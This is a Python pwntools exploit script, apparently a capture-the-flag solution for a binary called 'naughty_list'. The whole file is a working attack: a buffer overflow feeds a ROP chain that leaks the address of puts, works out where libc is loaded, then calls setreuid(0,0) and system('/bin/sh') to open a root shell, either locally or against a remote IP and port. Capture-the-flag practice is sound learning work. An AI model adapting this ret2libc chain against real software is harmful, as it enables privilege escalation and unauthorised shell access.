# #!/usr/bin/env python

from pwn import *

context.arch = "x86_64"
get_flag = False
chall_name = 'naughty_list'

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def run_with_gdb(p):
    gdb.attach(p,'''
    b *get_descr+74''')

def run_exploit(p, debug):
    ##### STAGE 0 - SETTING UP #####
    # Feeding input
    print(p.recv(timeout=2).decode())
    p.sendline(b'BRENNO')
    print(p.recv(timeout=2).decode())
    p.sendline(b'BRENNO')
    print(p.recv(timeout=2).decode())
    p.sendline(b'18')

    if debug:
        run_with_gdb(p)

    binary = ELF(chall_name)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
    # libc = ELF('libc.so.6') # remote

    overflow_until_ret = b'A' * (cyclic_find('faaaaaaa', n=8))

    ##### STAGE 1 - LEAKING PUTS AND RESTARTING PROGRAM #####
    rop = ROP(chall_name)
    rop.raw(rop.rdi)
    rop.raw(binary.got.puts)
    rop.raw(binary.plt.puts)
    rop.raw(binary.entrypoint)
    p.sendline(overflow_until_ret + rop.chain())

    # printing bla bla bla before the leak
    print(p.recv(timeout=2))
    p.recvline()
    print(p.recvline().decode())

    # getting the leak, adjusting with some ugliness
    puts_leaked = p.recvline()[:-1]
    print(puts_leaked)
    puts_adjusted = adjust_bytes_leaked_address(puts_leaked)
    print('leaked puts:', hex(puts_adjusted))
    
    ###### STAGE 2 - CALCULATING LIBC BASE AND GETTING USEFULL STUFF #####
    puts_libc_offset = libc.sym.puts
    print('Puts libc offset:', hex(puts_libc_offset))
    print('Leaked puts address:', hex(puts_adjusted))
    print('Calculating libc base:', hex(puts_adjusted), '-', hex(puts_libc_offset))
    libc_base = puts_adjusted - puts_libc_offset
    libc.address = libc_base # setting the base on our ELF object

    bin_sh_libc = next(libc.search(b'/bin/sh'))
    print('/bin/sh libc address: ', hex(bin_sh_libc))
    print('Mouting rop chain to setreuid(0, 0) and system(\'/bin/sh\')...')

    ###### STAGE 3 - PWINING AND GETTING SHELL #####
    rop = ROP(chall_name)
    rop.call(libc.sym.setreuid, [0, 0])
    rop.raw(rop.ret.address)
    rop.call(libc.sym.system, [bin_sh_libc])
    rop.call(libc.sym.exit, [0]) # exit cleanly because why not?
    print(rop.dump())
    print('Rop chain ready, press enter to pwn!')

    # Feeding input again
    print(p.recv(timeout=2).decode())
    p.sendline(b'BRENNO')
    print(p.recv(timeout=2).decode())
    p.sendline(b'BRENNO')
    print(p.recv(timeout=2).decode())
    p.sendline(b'18')

    # exploiting and getting shell
    p.sendline(overflow_until_ret + rop.chain())
    p.interactive()

if get_flag:
    p = remote('134.209.186.58', '32483')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)